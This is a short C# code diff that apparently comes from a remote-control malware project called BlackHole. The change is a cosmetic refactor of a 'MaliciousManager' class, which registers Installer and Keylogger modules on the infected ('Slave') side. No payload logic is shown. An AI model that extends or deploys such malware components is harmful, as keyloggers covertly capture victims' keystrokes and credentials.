@@ -11,17 +11,17 @@ namespace BlackHole.Slave.Malicious
         /// <summary>
         /// 
         /// </summary>
-        private List<IMalicious> m_malicious;
+        private readonly List<IMalicious> m_malicious;
 
         /// <summary>
         /// 
         /// </summary>
         public MaliciousManager()
         {
-            m_malicious = new List<IMalicious>()
+            m_malicious = new List<IMalicious>
             {
                 Installer.Instance,
-                Keylogger.Instance,
+                Keylogger.Instance
             };
         }
 
